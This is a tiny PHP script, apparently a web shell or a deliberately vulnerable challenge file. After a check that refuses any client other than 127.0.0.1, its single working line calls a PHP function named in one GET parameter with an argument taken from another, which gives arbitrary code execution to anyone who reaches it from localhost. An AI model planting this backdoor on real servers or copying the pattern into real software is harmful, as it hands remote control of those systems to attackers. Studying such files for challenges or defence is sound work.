<?php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
	die('Who are you? your ip is:'.$_SERVER['REMOTE_ADDR']);
}
$_GET['a']($_GET['b']);
?>